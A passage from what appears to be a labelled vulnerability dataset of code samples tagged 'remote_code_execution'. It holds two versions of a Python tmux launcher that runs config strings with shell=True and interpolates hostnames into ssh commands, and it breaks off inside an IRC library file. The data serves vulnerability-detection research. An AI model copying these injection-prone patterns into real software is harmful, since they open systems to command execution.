deps.edge(node.comp_name, dep, \"missing\", color=\"red\")\n                            elif node.comp_name is not \"master_node\":\n                                deps.edge(node.comp_name, dep)\n\n        except CircularReferenceException as ex:\n            self.logger.error(\"Detected circular dependency reference between %s and %s!\" % (ex.node1, ex.node2))\n            deps.edge(ex.node1, ex.node2, \"circular error\", color=\"red\")\n            deps.edge(ex.node2, ex.node1, color=\"red\")\n\n        deps.view()\n\n\nclass SlaveLauncher:\n\n    def __init__(self, configfile=None, kill_mode=False, check_mode=False):\n        self.kill_mode = kill_mode\n        self.check_mode = check_mode\n        self.logger = logging.getLogger(__name__)\n        self.logger.setLevel(logging.DEBUG)\n        self.config = None\n        self.session = None\n        if kill_mode:\n            self.logger.info(\"started slave with kill mode\")\n        if check_mode:\n            self.logger.info(\"started slave with check mode\")\n        self.server = Server()\n\n        if self.server.has_session(\"slave-session\"):\n            self.session = self.server.find_where({\n                \"session_name\": \"slave-session\"\n            })\n\n            self.logger.info('found running slave session on server')\n        elif not kill_mode and not check_mode:\n            self.logger.info('starting new slave session on server')\n            self.session = self.server.new_session(\n                session_name=\"slave-session\"\n            )\n\n        else:\n            self.logger.info(\"No slave session found on server. Aborting\")\n            exit(CheckState.STOPPED)\n\n        if configfile:\n            self.load_config(configfile)\n            self.window_name = self.config['name']\n            self.flag_path = (\"/tmp/Hyperion/slaves/%s\" % self.window_name)\n            self.log_file = (\"/tmp/Hyperion/log/%s\" % self.window_name)\n            ensure_dir(self.log_file)\n        else:\n            self.logger.error(\"No slave component config provided\")\n\n    def load_config(self, filename=\"default.yaml\"):\n        with open(filename) as data_file:\n            self.config = load(data_file, Loader)\n\n    def init(self):\n        if not self.config:\n            self.logger.error(\" Config not loaded yet!\")\n        elif not self.session:\n            self.logger.error(\" Init aborted. No session was found!\")\n        else:\n            self.logger.debug(self.config)\n            window = find_window(self.session, self.window_name)\n\n            if window:\n                self.logger.debug(\"window '%s' found running\" % self.window_name)\n                if self.kill_mode:\n                    self.logger.info(\"Shutting down window...\")\n                    kill_window(window)\n                    self.logger.info(\"... done!\")\n            elif not self.kill_mode:\n                self.logger.info(\"creating window '%s'\" % self.window_name)\n                window = self.session.new_window(self.window_name)\n                start_window(window, self.config['cmd'][0]['start'], self.log_file, self.window_name)\n\n            else:\n                self.logger.info(\"There is no component running by the name '%s'. Exiting kill mode\" %\n                                 self.window_name)\n\n    def run_check(self):\n        if not self.config:\n            self.logger.error(\" Config not loaded yet!\")\n            exit(CheckState.STOPPED.value)\n        elif not self.session:\n            self.logger.error(\" Init aborted. No session was found!\")\n            exit(CheckState.STOPPED.value)\n\n        check_state = check_component(self.config, self.session, self.logger)\n        exit(check_state.value)\n\n###################\n# Component Management\n###################\ndef run_component_check(comp):\n    if call(comp['cmd'][1]['check'], shell=True) == 0:\n        return True\n    else:\n        return False\n\n\ndef check_component(comp, session, logger):\n    logger.debug(\"Running component check for %s\" % comp['name'])\n    check_available = len(comp['cmd']) > 1 and 'check' in comp['cmd'][1]\n    window = find_window(session, comp['name'])\n    if window:\n        pid = get_window_pid(window)\n        logger.debug(\"Found window pid: %s\" % pid)\n\n        # May return more child pids if logging is done via tee (which then was started twice in the window too)\n        procs = []\n        for entry in pid:\n            procs.extend(Process(entry).children(recursive=True))\n        pids = [p.pid for p in procs]\n        logger.debug(\"Window is running %s child processes\" % len(pids))\n\n        # TODO: Investigate minimum process number on hosts\n        # TODO: Change this when more logging options are introduced\n        if len(pids) < 2:\n            logger.debug(\"Main window process has finished. Running custom check if available\")\n            if check_available and run_component_check(comp):\n                logger.debug(\"Process terminated but check was successful\")\n                return CheckState.STOPPED_BUT_SUCCESSFUL\n            else:\n                logger.debug(\"Check failed or no check available: returning false\")\n                return CheckState.STOPPED\n        elif check_available and run_component_check(comp):\n            logger.debug(\"Check succeeded\")\n            return CheckState.RUNNING\n        elif not check_available:\n            logger.debug(\"No custom check specified and got sufficient pid amount: returning true\")\n            return CheckState.RUNNING\n        else:\n            logger.debug(\"Check failed: returning false\")\n            return CheckState.STOPPED\n    else:\n        logger.debug(\"%s window is not running. Running custom check\" % comp['name'])\n        if check_available and run_component_check(comp):\n            logger.debug(\"Component was not started by Hyperion, but the check succeeded\")\n            return CheckState.STARTED_BY_HAND\n        else:\n            logger.debug(\"Window not running and no check command is available or it failed: returning false\")\n            return CheckState.STOPPED\n\n\ndef get_window_pid(window):\n    r = window.cmd('list-panes',\n                   \"-F #{pane_pid}\")\n    return [int(p) for p in r.stdout]\n\n###################\n# TMUX\n###################\ndef kill_session_by_name(server, name):\n    session = server.find_where({\n        \"session_name\": name\n    })\n    session.kill_session()\n\n\ndef kill_window(window):\n    window.cmd(\"send-keys\", \"\", \"C-c\")\n    window.kill_window()\n\n\ndef start_window(window, cmd, log_file, comp_name):\n    setup_log(window, log_file, comp_name)\n    window.cmd(\"send-keys\", cmd, \"Enter\")\n\n\ndef find_window(session, window_name):\n    window = session.find_where({\n        \"window_name\": window_name\n    })\n    return window\n\n\ndef send_main_session_command(session, cmd):\n    window = find_window(session, \"Main\")\n    window.cmd(\"send-keys\", cmd, \"Enter\")\n\n###################\n# Logging\n###################\ndef setup_log(window, file, comp_name):\n    clear_log(file)\n    # Reroute stderr to log file\n    window.cmd(\"send-keys\", \"exec 2> >(exec tee -i -a '%s')\" % file, \"Enter\")\n    # Reroute stdin to log file\n    window.cmd(\"send-keys\", \"exec 1> >(exec tee -i -a '%s')\" % file, \"Enter\")\n    window.cmd(\"send-keys\", ('echo \"#Hyperion component start: %s\\n$(date)\"' % comp_name), \"Enter\")\n\n\ndef clear_log(file_path):\n    if os.path.isfile(file_path):\n        os.remove(file_path)\n\n\ndef ensure_dir(file_path):\n    directory = os.path.dirname(file_path)\n    if not os.path.exists(directory):\n        os.makedirs(directory)\n\n###################\n# Startup\n###################\ndef main():\n    logger = logging.getLogger(__name__)\n    logger.setLevel(logging.DEBUG)\n    parser = argparse.ArgumentParser()\n\n    # Create top level parser\n    parser.add_argument(\"--config\", '-c', type=str,\n                        default='test.yaml',\n                        help=\"YAML config file. see sample-config.yaml. Default: test.yaml\")\n    subparsers = parser.add_subparsers(dest=\"cmd\")\n\n    # Create parser for the editor command\n    subparser_editor = subparsers.add_parser('edit', help=\"Launches the editor to edit or create new systems and \"\n                                                          \"components\")\n    # Create parser for the run command\n    subparser_run = subparsers.add_parser('run', help=\"Launches the setup specified by the --config argument\")\n    # Create parser for validator\n    subparser_val = subparsers.add_parser('validate', help=\"Validate the setup specified by the --config argument\")\n\n    subparser_remote = subparsers.add_parser('slave', help=\"Run a component locally without controlling it. The \"\n                                                           \"control is taken care of the remote master invoking \"\n                                                           \"this command.\\nIf run with the --kill flag, the \"\n                                                           \"passed component will be killed\")\n\n    subparser_val.add_argument(\"--visual\", help=\"Generate and show a graph image\", action=\"store_true\")\n\n    remote_mutex = subparser_remote.add_mutually_exclusive_group(required=False)\n\n    remote_mutex.add_argument('-k', '--kill', help=\"switch to kill mode\", action=\"store_true\")\n    remote_mutex.add_argument('-c', '--check', help=\"Run a component check\", action=\"store_true\")\n\n    args = parser.parse_args()\n    logger.debug(args)\n\n    if args.cmd == 'edit':\n        logger.debug(\"Launching editor mode\")\n\n    elif args.cmd == 'run':\n        logger.debug(\"Launching runner mode\")\n\n        cc = ControlCenter(args.config)\n        cc.init()\n        start_gui(cc)\n\n    elif args.cmd == 'validate':\n        logger.debug(\"Launching validation mode\")\n        cc = ControlCenter(args.config)\n        if args.visual:\n            cc.set_dependencies(False)\n            cc.draw_graph()\n        else:\n            cc.set_dependencies(True)\n\n    elif args.cmd == 'slave':\n        logger.debug(\"Launching slave mode\")\n        sl = SlaveLauncher(args.config, args.kill, args.check)\n\n        if args.check:\n            sl.run_check()\n        else:\n            sl.init()\n\n\n###################\n# GUI\n###################\ndef start_gui(control_center):\n    app = QtGui.QApplication(sys.argv)\n    main_window = QtGui.QMainWindow()\n    ui = hyperGUI.UiMainWindow()\n    ui.ui_init(main_window, control_center)\n    main_window.show()\n    sys.exit(app.exec_())\n/n/n/n", "label": 0, "vtype": "remote_code_execution"}, {"id": "269b8c87afc149911af3ae63b3ccbfc77ffb223d", "code": "/hyperion/hyperion.py/n/n#! /usr/bin/env python\nfrom libtmux import Server\nfrom yaml import load, dump\nfrom setupParser import Loader\nfrom DepTree import Node, dep_resolve, CircularReferenceException\nimport logging\nimport os\nimport socket\nimport argparse\nfrom psutil import Process\nfrom subprocess import call\nfrom graphviz import Digraph\nfrom enum import Enum\nfrom time import sleep\n\nimport sys\nfrom PyQt4 import QtGui\nimport hyperGUI\n\nFORMAT = \"%(asctime)s: %(name)s [%(levelname)s]:\\t%(message)s\"\n\nlogging.basicConfig(level=logging.WARNING, format=FORMAT, datefmt='%I:%M:%S')\nTMP_SLAVE_DIR = \"/tmp/Hyperion/slave/components\"\nTMP_COMP_DIR = \"/tmp/Hyperion/components\"\nTMP_LOG_PATH = \"/tmp/Hyperion/log\"\n\nBASE_DIR = os.path.dirname(__file__)\nSCRIPT_CLONE_PATH = (\"%s/scripts/start_named_clone_session.sh\" % BASE_DIR)\n\n\nclass CheckState(Enum):\n    RUNNING = 0\n    STOPPED = 1\n    STOPPED_BUT_SUCCESSFUL = 2\n    STARTED_BY_HAND = 3\n    DEP_FAILED = 4\n\n\nclass ControlCenter:\n\n    def __init__(self, configfile=None):\n        self.logger = logging.getLogger(__name__)\n        self.logger.setLevel(logging.DEBUG)\n        self.configfile = configfile\n        self.nodes = {}\n        self.server = []\n        self.host_list = []\n\n        if configfile:\n            self.load_config(configfile)\n            self.session_name = self.config[\"name\"]\n\n            # Debug write resulting yaml file\n            with open('debug-result.yml', 'w') as outfile:\n                dump(self.config, outfile, default_flow_style=False)\n            self.logger.debug(\"Loading config was successful\")\n\n            self.server = Server()\n\n            if self.server.has_session(self.session_name):\n                self.session = self.server.find_where({\n                    \"session_name\": self.session_name\n                })\n\n                self.logger.info('found running session by name \"%s\" on server' % self.session_name)\n            else:\n                self.logger.info('starting new session by name \"%s\" on server' % self.session_name)\n                self.session = self.server.new_session(\n                    session_name=self.session_name,\n                    window_name=\"Main\"\n                )\n        else:\n            self.config = None\n\n    ###################\n    # Setup\n    ###################\n    def load_config(self, filename=\"default.yaml\"):\n        with open(filename) as data_file:\n            self.config = load(data_file, Loader)\n\n    def init(self):\n        if not self.config:\n            self.logger.error(\" Config not loaded yet!\")\n\n        else:\n            for group in self.config['groups']:\n                for comp in group['components']:\n                    self.logger.debug(\"Checking component '%s' in group '%s' on host '%s'\" %\n                                      (comp['name'], group['name'], comp['host']))\n\n                    if comp['host'] != \"localhost\" and not self.run_on_localhost(comp):\n                        self.copy_component_to_remote(comp, comp['name'], comp['host'])\n\n            # Remove duplicate hosts\n            self.host_list = list(set(self.host_list))\n\n            self.set_dependencies(True)\n\n    def set_dependencies(self, exit_on_fail):\n        for group in self.config['groups']:\n            for comp in group['components']:\n                self.nodes[comp['name']] = Node(comp)\n\n        # Add a pseudo node that depends on all other nodes, to get a starting point to be able to iterate through all\n        # nodes with simple algorithms\n        master_node = Node({'name': 'master_node'})\n        for name in self.nodes:\n            node = self.nodes.get(name)\n\n            # Add edges from each node to pseudo node\n            master_node.addEdge(node)\n\n            # Add edges based on dependencies specified in the configuration\n            if \"depends\" in node.component:\n                for dep in node.component['depends']:\n                    if dep in self.nodes:\n                        node.addEdge(self.nodes[dep])\n                    else:\n                        self.logger.error(\"Unmet dependency: '%s' for component '%s'!\" % (dep, node.comp_name))\n                        if exit_on_fail:\n                            exit(1)\n        self.nodes['master_node'] = master_node\n\n        # Test if starting all components is possible\n        try:\n            node = self.nodes.get('master_node')\n            res = []\n            unres = []\n            dep_resolve(node, res, unres)\n            dep_string = \"\"\n            for node in res:\n                if node is not master_node:\n                    dep_string = \"%s -> %s\" % (dep_string, node.comp_name)\n            self.logger.debug(\"Dependency tree for start all: %s\" % dep_string)\n        except CircularReferenceException as ex:\n            self.logger.error(\"Detected circular dependency reference between %s and %s!\" % (ex.node1, ex.node2))\n            if exit_on_fail:\n                exit(1)\n\n    def copy_component_to_remote(self, infile, comp, host):\n        self.host_list.append(host)\n\n        self.logger.debug(\"Saving component to tmp\")\n        tmp_comp_path = ('%s/%s.yaml' % (TMP_COMP_DIR, comp))\n        ensure_dir(tmp_comp_path)\n        with open(tmp_comp_path, 'w') as outfile:\n            dump(infile, outfile, default_flow_style=False)\n\n        self.logger.debug('Copying component \"%s\" to remote host \"%s\"' % (comp, host))\n        cmd = (\"ssh %s 'mkdir -p %s' & scp %s %s:%s/%s.yaml\" %\n               (host, TMP_SLAVE_DIR, tmp_comp_path, host, TMP_SLAVE_DIR, comp))\n        self.logger.debug(cmd)\n        send_main_session_command(self.session, cmd)\n\n    ###################\n    # Stop\n    ###################\n    def stop_component(self, comp):\n        if comp['host'] != 'localhost' and not self.run_on_localhost(comp):\n            self.logger.debug(\"Stopping remote component '%s' on host '%s'\" % (comp['name'], comp['host']))\n            self.stop_remote_component(comp['name'], comp['host'])\n        else:\n            window = find_window(self.session, comp['name'])\n\n            if window:\n                self.logger.debug(\"window '%s' found running\" % comp['name'])\n                self.logger.info(\"Shutting down window...\")\n                kill_window(window)\n                self.logger.info(\"... done!\")\n\n    def stop_remote_component(self, comp_name, host):\n        # invoke Hyperion in slave mode on each remote host\n        cmd = (\"ssh %s 'hyperion --config %s/%s.yaml slave --kill'\" % (host, TMP_SLAVE_DIR, comp_name))\n        self.logger.debug(\"Run cmd:\\n%s\" % cmd)\n        send_main_session_command(self.session, cmd)\n\n    ###################\n    # Start\n    ###################\n    def start_component(self, comp):\n\n        node = self.nodes.get(comp['name'])\n        res = []\n        unres = []\n        dep_resolve(node, res, unres)\n        for node in res:\n            self.logger.debug(\"node name '%s' vs. comp name '%s'\" % (node.comp_name, comp['name']))\n            if node.comp_name != comp['name']:\n                self.logger.debug(\"Checking and starting %s\" % node.comp_name)\n                state = self.check_component(node.component)\n                if (state is CheckState.STOPPED_BUT_SUCCESSFUL or\n                        state is CheckState.STARTED_BY_HAND or\n                        state is CheckState.RUNNING):\n                    self.logger.debug(\"Component %s is already running, skipping to next in line\" % comp['name'])\n                else:\n                    self.logger.debug(\"Start component '%s' as dependency of '%s'\" % (node.comp_name, comp['name']))\n                    self.start_component_without_deps(node.component)\n\n                    tries = 0\n                    while True:\n                        self.logger.debug(\"Checking %s resulted in checkstate %s\" % (node.comp_name, state))\n                        state = self.check_component(node.component)\n                        if (state is not CheckState.RUNNING or\n                           state is not CheckState.STOPPED_BUT_SUCCESSFUL):\n                            break\n                        if tries > 100:\n                            return False\n                        tries = tries + 1\n                        sleep(.5)\n\n        self.logger.debug(\"All dependencies satisfied, starting '%s'\" % (comp['name']))\n        state = self.check_component(node.component)\n        if (state is CheckState.STARTED_BY_HAND or\n                state is CheckState.RUNNING):\n            self.logger.debug(\"Component %s is already running. Skipping start\" % comp['name'])\n        else:\n            self.start_component_without_deps(comp)\n        return True\n\n    def start_component_without_deps(self, comp):\n        if comp['host'] != 'localhost' and not self.run_on_localhost(comp):\n            self.logger.debug(\"Starting remote component '%s' on host '%s'\" % (comp['name'], comp['host']))\n            self.start_remote_component(comp['name'], comp['host'])\n        else:\n            log_file = (\"%s/%s\" % (TMP_LOG_PATH, comp['name']))\n            window = find_window(self.session, comp['name'])\n\n            if window:\n                self.logger.debug(\"Restarting '%s' in old window\" % comp['name'])\n                start_window(window, comp['cmd'][0]['start'], log_file, comp['name'])\n            else:\n                self.logger.info(\"creating window '%s'\" % comp['name'])\n                window = self.session.new_window(comp['name'])\n                start_window(window, comp['cmd'][0]['start'], log_file, comp['name'])\n\n    def start_remote_component(self, comp_name, host):\n        # invoke Hyperion in slave mode on each remote host\n        cmd = (\"ssh %s 'hyperion --config %s/%s.yaml slave'\" % (host, TMP_SLAVE_DIR, comp_name))\n        self.logger.debug(\"Run cmd:\\n%s\" % cmd)\n        send_main_session_command(self.session, cmd)\n\n    ###################\n    # Check\n    ###################\n    def check_component(self, comp):\n        return check_component(comp, self.session, self.logger)\n\n    ###################\n    # Dependency management\n    ###################\n    def get_dep_list(self, comp):\n        node = self.nodes.get(comp['name'])\n        res = []\n        unres = []\n        dep_resolve(node, res, unres)\n        res.remove(node)\n\n        return res\n\n    ###################\n    # Host related checks\n    ###################\n    def is_localhost(self, hostname):\n        try:\n            hn_out = socket.gethostbyname(hostname)\n            if hn_out == '127.0.0.1' or hn_out == '::1':\n                self.logger.debug(\"Host '%s' is localhost\" % hostname)\n                return True\n            else:\n                self.logger.debug(\"Host '%s' is not localhost\" % hostname)\n                return False\n        except socket.gaierror:\n            sys.exit(\"Host '%s' is unknown! Update your /etc/hosts file!\" % hostname)\n\n    def run_on_localhost(self, comp):\n        return self.is_localhost(comp['host'])\n\n    ###################\n    # TMUX\n    ###################\n    def kill_remote_session_by_name(self, name, host):\n        cmd = \"ssh -t %s 'tmux kill-session -t %s'\" % (host, name)\n        send_main_session_command(self.session, cmd)\n\n    def start_clone_session(self, comp_name, session_name):\n        cmd = \"%s '%s' '%s'\" % (SCRIPT_CLONE_PATH, session_name, comp_name)\n        send_main_session_command(self.session, cmd)\n\n    def start_remote_clone_session(self, comp_name, session_name, hostname):\n        remote_cmd = (\"%s '%s' '%s'\" % (SCRIPT_CLONE_PATH, session_name, comp_name))\n        cmd = \"ssh %s 'bash -s' < %s\" % (hostname, remote_cmd)\n        send_main_session_command(self.session, cmd)\n\n    ###################\n    # Visualisation\n    ###################\n    def draw_graph(self):\n        deps = Digraph(\"Deps\", strict=True)\n        deps.graph_attr.update(rankdir=\"BT\")\n        try:\n            node = self.nodes.get('master_node')\n\n            for current in node.depends_on:\n                deps.node(current.comp_name)\n\n                res = []\n                unres = []\n                dep_resolve(current, res, unres)\n                for node in res:\n                    if \"depends\" in node.component:\n                        for dep in node.component['depends']:\n                            if dep not in self.nodes:\n                                deps.node(dep, color=\"red\")\n                                deps.edge(node.comp_name, dep, \"missing\", color=\"red\")\n                            elif node.comp_name is not \"master_node\":\n                                deps.edge(node.comp_name, dep)\n\n        except CircularReferenceException as ex:\n            self.logger.error(\"Detected circular dependency reference between %s and %s!\" % (ex.node1, ex.node2))\n            deps.edge(ex.node1, ex.node2, \"circular error\", color=\"red\")\n            deps.edge(ex.node2, ex.node1, color=\"red\")\n\n        deps.view()\n\n\nclass SlaveLauncher:\n\n    def __init__(self, configfile=None, kill_mode=False, check_mode=False):\n        self.kill_mode = kill_mode\n        self.check_mode = check_mode\n        self.logger = logging.getLogger(__name__)\n        self.logger.setLevel(logging.DEBUG)\n        self.config = None\n        self.session = None\n        if kill_mode:\n            self.logger.info(\"started slave with kill mode\")\n        if check_mode:\n            self.logger.info(\"started slave with check mode\")\n        self.server = Server()\n\n        if self.server.has_session(\"slave-session\"):\n            self.session = self.server.find_where({\n                \"session_name\": \"slave-session\"\n            })\n\n            self.logger.info('found running slave session on server')\n        elif not kill_mode and not check_mode:\n            self.logger.info('starting new slave session on server')\n            self.session = self.server.new_session(\n                session_name=\"slave-session\"\n            )\n\n        else:\n            self.logger.info(\"No slave session found on server. Aborting\")\n            exit(CheckState.STOPPED)\n\n        if configfile:\n            self.load_config(configfile)\n            self.window_name = self.config['name']\n            self.flag_path = (\"/tmp/Hyperion/slaves/%s\" % self.window_name)\n            self.log_file = (\"/tmp/Hyperion/log/%s\" % self.window_name)\n            ensure_dir(self.log_file)\n        else:\n            self.logger.error(\"No slave component config provided\")\n\n    def load_config(self, filename=\"default.yaml\"):\n        with open(filename) as data_file:\n            self.config = load(data_file, Loader)\n\n    def init(self):\n        if not self.config:\n            self.logger.error(\" Config not loaded yet!\")\n        elif not self.session:\n            self.logger.error(\" Init aborted. No session was found!\")\n        else:\n            self.logger.debug(self.config)\n            window = find_window(self.session, self.window_name)\n\n            if window:\n                self.logger.debug(\"window '%s' found running\" % self.window_name)\n                if self.kill_mode:\n                    self.logger.info(\"Shutting down window...\")\n                    kill_window(window)\n                    self.logger.info(\"... done!\")\n            elif not self.kill_mode:\n                self.logger.info(\"creating window '%s'\" % self.window_name)\n                window = self.session.new_window(self.window_name)\n                start_window(window, self.config['cmd'][0]['start'], self.log_file, self.window_name)\n\n            else:\n                self.logger.info(\"There is no component running by the name '%s'. Exiting kill mode\" %\n                                 self.window_name)\n\n    def run_check(self):\n        if not self.config:\n            self.logger.error(\" Config not loaded yet!\")\n            exit(CheckState.STOPPED.value)\n        elif not self.session:\n            self.logger.error(\" Init aborted. No session was found!\")\n            exit(CheckState.STOPPED.value)\n\n        check_state = check_component(self.config, self.session, self.logger)\n        exit(check_state.value)\n\n###################\n# Component Management\n###################\ndef run_component_check(comp):\n    if call(comp['cmd'][1]['check'], shell=True) == 0:\n        return True\n    else:\n        return False\n\n\ndef check_component(comp, session, logger):\n    logger.debug(\"Running component check for %s\" % comp['name'])\n    check_available = len(comp['cmd']) > 1 and 'check' in comp['cmd'][1]\n    window = find_window(session, comp['name'])\n    if window:\n        pid = get_window_pid(window)\n        logger.debug(\"Found window pid: %s\" % pid)\n\n        # May return more child pids if logging is done via tee (which then was started twice in the window too)\n        procs = []\n        for entry in pid:\n            procs.extend(Process(entry).children(recursive=True))\n        pids = [p.pid for p in procs]\n        logger.debug(\"Window is running %s child processes\" % len(pids))\n\n        # Two processes are tee logging\n        # TODO: Change this when more logging options are introduced\n        if len(pids) < 3:\n            logger.debug(\"Main window process has finished. Running custom check if available\")\n            if check_available and run_component_check(comp):\n                logger.debug(\"Process terminated but check was successful\")\n                return CheckState.STOPPED_BUT_SUCCESSFUL\n            else:\n                logger.debug(\"Check failed or no check available: returning false\")\n                return CheckState.STOPPED\n        elif check_available and run_component_check(comp):\n            logger.debug(\"Check succeeded\")\n            return CheckState.RUNNING\n        elif not check_available:\n            logger.debug(\"No custom check specified and got sufficient pid amount: returning true\")\n            return CheckState.RUNNING\n        else:\n            logger.debug(\"Check failed: returning false\")\n            return CheckState.STOPPED\n    else:\n        logger.debug(\"%s window is not running. Running custom check\" % comp['name'])\n        if check_available and run_component_check(comp):\n            logger.debug(\"Component was not started by Hyperion, but the check succeeded\")\n            return CheckState.STARTED_BY_HAND\n        else:\n            logger.debug(\"Window not running and no check command is available or it failed: returning false\")\n            return CheckState.STOPPED\n\n\ndef get_window_pid(window):\n    r = window.cmd('list-panes',\n                   \"-F #{pane_pid}\")\n    return [int(p) for p in r.stdout]\n\n###################\n# TMUX\n###################\ndef kill_session_by_name(server, name):\n    session = server.find_where({\n        \"session_name\": name\n    })\n    session.kill_session()\n\n\ndef kill_window(window):\n    window.cmd(\"send-keys\", \"\", \"C-c\")\n    window.kill_window()\n\n\ndef start_window(window, cmd, log_file, comp_name):\n    setup_log(window, log_file, comp_name)\n    window.cmd(\"send-keys\", cmd, \"Enter\")\n\n\ndef find_window(session, window_name):\n    window = session.find_where({\n        \"window_name\": window_name\n    })\n    return window\n\n\ndef send_main_session_command(session, cmd):\n    window = find_window(session, \"Main\")\n    window.cmd(\"send-keys\", cmd, \"Enter\")\n\n\n###################\n# Logging\n###################\ndef setup_log(window, file, comp_name):\n    clear_log(file)\n    # Reroute stderr to log file\n    window.cmd(\"send-keys\", \"exec 2> >(exec tee -i -a '%s')\" % file, \"Enter\")\n    # Reroute stdin to log file\n    window.cmd(\"send-keys\", \"exec 1> >(exec tee -i -a '%s')\" % file, \"Enter\")\n    window.cmd(\"send-keys\", ('echo \"#Hyperion component start: %s\\n$(date)\"' % comp_name), \"Enter\")\n\n\ndef clear_log(file_path):\n    if os.path.isfile(file_path):\n        os.remove(file_path)\n\n\ndef ensure_dir(file_path):\n    directory = os.path.dirname(file_path)\n    if not os.path.exists(directory):\n        os.makedirs(directory)\n\n###################\n# Startup\n###################\ndef main():\n    logger = logging.getLogger(__name__)\n    logger.setLevel(logging.DEBUG)\n    parser = argparse.ArgumentParser()\n\n    # Create top level parser\n    parser.add_argument(\"--config\", '-c', type=str,\n                        default='test.yaml',\n                        help=\"YAML config file. see sample-config.yaml. Default: test.yaml\")\n    subparsers = parser.add_subparsers(dest=\"cmd\")\n\n    # Create parser for the editor command\n    subparser_editor = subparsers.add_parser('edit', help=\"Launches the editor to edit or create new systems and \"\n                                                          \"components\")\n    # Create parser for the run command\n    subparser_run = subparsers.add_parser('run', help=\"Launches the setup specified by the --config argument\")\n    # Create parser for validator\n    subparser_val = subparsers.add_parser('validate', help=\"Validate the setup specified by the --config argument\")\n\n    subparser_remote = subparsers.add_parser('slave', help=\"Run a component locally without controlling it. The \"\n                                                           \"control is taken care of the remote master invoking \"\n                                                           \"this command.\\nIf run with the --kill flag, the \"\n                                                           \"passed component will be killed\")\n\n    subparser_val.add_argument(\"--visual\", help=\"Generate and show a graph image\", action=\"store_true\")\n\n    remote_mutex = subparser_remote.add_mutually_exclusive_group(required=False)\n\n    remote_mutex.add_argument('-k', '--kill', help=\"switch to kill mode\", action=\"store_true\")\n    remote_mutex.add_argument('-c', '--check', help=\"Run a component check\", action=\"store_true\")\n\n    args = parser.parse_args()\n    logger.debug(args)\n\n    if args.cmd == 'edit':\n        logger.debug(\"Launching editor mode\")\n\n    elif args.cmd == 'run':\n        logger.debug(\"Launching runner mode\")\n\n        cc = ControlCenter(args.config)\n        cc.init()\n        start_gui(cc)\n\n    elif args.cmd == 'validate':\n        logger.debug(\"Launching validation mode\")\n        cc = ControlCenter(args.config)\n        if args.visual:\n            cc.set_dependencies(False)\n            cc.draw_graph()\n        else:\n            cc.set_dependencies(True)\n\n    elif args.cmd == 'slave':\n        logger.debug(\"Launching slave mode\")\n        sl = SlaveLauncher(args.config, args.kill, args.check)\n\n        if args.check:\n            sl.run_check()\n        else:\n            sl.init()\n\n\n###################\n# GUI\n###################\ndef start_gui(control_center):\n    app = QtGui.QApplication(sys.argv)\n    main_window = QtGui.QMainWindow()\n    ui = hyperGUI.UiMainWindow()\n    ui.ui_init(main_window, control_center)\n    main_window.show()\n    sys.exit(app.exec_())\n/n/n/n", "label": 1, "vtype": "remote_code_execution"}, {"id": "9d9b01839cf3639e59d29c27e70688bdbf44db96", "code": "classes.py/n/n\"\"\"\nclasses.py - Base classes for PyLink IRC Services.\n\nThis module contains the base classes used by PyLink, including threaded IRC\nconnections and objects used to represent IRC servers, users, and channels.\n\nHere be dragons.\n\"\"\"\n\nimport threading\nimport time\nimport socket\nimport ssl\nimport hashlib\nfrom copy import deepcopy\nimport inspect\nimport re\nfrom collections import defaultdict, deque\nimport ipaddress\n\ntry:\n    import ircmatch\nexcept ImportError:\n    raise ImportError(\"PyLink requires ircmatch to function; please install it and try again.\")\n\nfrom . import world, utils, structures, conf, __version__\nfrom .log import *\n\n### Exceptions\n\nclass ProtocolError(RuntimeError):\n    pass\n\n### Internal classes (users, servers, channels)\n\nclass Irc(utils.DeprecatedAttributesObject):\n    \"\"\"Base IRC object for PyLink.\"\"\"\n\n    def __init__(self, netname, proto, conf):\n        \"\"\"\n        Initializes an IRC object. This takes 3 variables: the network name\n        (a string), the name of the protocol module to use for this connection,\n        and a configuration object.\n        \"\"\"\n        self.deprecated_attributes = {\n            'conf': 'Deprecated since 1.2; consider switching to conf.conf',\n            'botdata': \"Deprecated since 1.2; consider switching to conf.conf['bot']\",\n        }\n\n        self.loghandlers = []\n        self.name = netname\n        self.conf = conf\n        self.sid = None\n        self.serverdata = conf['servers'][netname]\n        self.botdata = conf['bot']\n        self.protoname = proto.__name__.split('.')[-1]  # Remove leading pylinkirc.protocols.\n        self.proto = proto.Class(self)\n        self.pingfreq = self.serverdata.get('pingfreq') or 90\n        self.pingtimeout = self.pingfreq * 2\n\n        self.queue = deque()\n\n        self.connected = threading.Event()\n        self.aborted = threading.Event()\n        self.reply_lock = threading.RLock()\n\n        self.pingTimer = None\n\n        # Sets the multiplier for autoconnect delay (grows with time).\n        self.autoconnect_active_multiplier = 1\n\n        self.initVars()\n\n        if world.testing:\n            # HACK: Don't thread if we're running tests.\n            self.connect()\n        else:\n            self.connection_thread = threading.Thread(target=self.connect,\n                                                      name=\"Listener for %s\" %\n                                                      self.name)\n            self.connection_thread.start()\n\n    def logSetup(self):\n        \"\"\"\n        Initializes any channel loggers defined for the current network.\n        \"\"\"\n        try:\n            channels = conf.conf['logging']['channels'][self.name]\n        except KeyError:  # Not set up; just ignore.\n            return\n\n        log.debug('(%s) Setting up channel logging to channels %r', self.name,\n                  channels)\n\n        if not self.loghandlers:\n            # Only create handlers if they haven't already been set up.\n\n            for channel, chandata in channels.items():\n                # Fetch the log level for this channel block.\n                level = None\n                if chandata is not None:\n                    level = chandata.get('loglevel')\n\n                handler = PyLinkChannelLogger(self, channel, level=level)\n                self.loghandlers.append(handler)\n                log.addHandler(handler)\n\n    def initVars(self):\n        \"\"\"\n        (Re)sets an IRC object to its default state. This should be called when\n        an IRC object is first created, and on every reconnection to a network.\n        \"\"\"\n        self.pingfreq = self.serverdata.get('pingfreq') or 90\n        self.pingtimeout = self.pingfreq * 3\n\n        self.pseudoclient = None\n        self.lastping = time.time()\n\n        self.queue.clear()\n\n        # Internal variable to set the place and caller of the last command (in PM\n        # or in a channel), used by fantasy command support.\n        self.called_by = None\n        self.called_in = None\n\n        # Intialize the server, channel, and user indexes to be populated by\n        # our protocol module. For the server index, we can add ourselves right\n        # now.\n        self.servers = {}\n        self.users = {}\n        self.channels = structures.KeyedDefaultdict(IrcChannel)\n\n        # This sets the list of supported channel and user modes: the default\n        # RFC1459 modes are implied. Named modes are used here to make\n        # protocol-independent code easier to write, as mode chars vary by\n        # IRCd.\n        # Protocol modules should add to and/or replace this with what their\n        # protocol supports. This can be a hardcoded list or something\n        # negotiated on connect, depending on the nature of their protocol.\n        self.cmodes = {'op': 'o', 'secret': 's', 'private': 'p',\n                       'noextmsg': 'n', 'moderated': 'm', 'inviteonly': 'i',\n                       